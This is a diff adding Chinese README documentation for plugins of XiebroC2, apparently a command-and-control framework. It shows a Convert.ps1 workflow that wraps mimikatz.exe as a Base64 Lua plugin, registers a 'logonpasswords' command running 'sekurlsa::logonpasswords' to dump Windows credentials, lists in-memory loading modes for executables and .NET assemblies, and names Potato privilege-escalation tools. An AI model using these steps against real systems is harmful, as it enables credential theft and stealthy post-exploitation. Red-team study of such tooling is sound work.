@@ -37,3 +37,55 @@ Manage->Plugins->Load，加载main.lua即可
 |  [BadPotato](https://github.com/BeichenDream/BadPotato)  |                 将服务器权限提升至System权限                 |
 |  [GodPotato](https://github.com/BeichenDream/GodPotato)  |                 将服务器权限提升至System权限                 |
 
+
+
+
+
+XiebroC2的插件做到极度的简洁化，几乎使用一行代码你就可以为它添加一个外部命令
+
+用Convert.ps1脚本可以直接将C/C++/Go/rust/.net/Bin等PE直接转成lua脚本
+
+```powershell
+Import-Module .\Convert.ps1
+```
+
+```powershell
+Convert-ExeToBase64Lua -i "C:\Users\admin\Desktop\mimikatz.exe" -o "mimikatz.lua" -Command "Mimikatz" -LoadModule "inline-execute" -Description "Get windows password credentials" -Usage "Mimikatz <args>"
+```
+
+
+
+```lua
+AddCommand_W(
+    "mimikatz",
+    mimikatz,
+    "inline-execute",
+    "Get password credentials on windows",
+    "mimikatz <args>"
+);
+```
+
+
+
+```lua
+AddCommand_A(
+    "logonpasswords",                                      --命令名称
+     mimikatz,                                            --Base64Compress
+    "privilege::debug sekurlsa::logonpasswords exit",      --exe的参数
+    "inline-execute",                                      --加载模式
+    "Get password credentials on windows",                 --命令描述
+    "logonpasswords"                                       --使用方法
+);
+```
+
+
+
+这里的LoadModule(加载模式)有四种
+
+```lua
+inline-execute           --内联加载C/C++/go/rust的exe文件
+inline-execute-bin           --内联加载C/C++/go/rust的bin文件
+inline-assembly	         --内联加载.net文件
+execute-assembly         --Fork&&Run模式(创建子进程)进行内存加载.net文件
+```
+
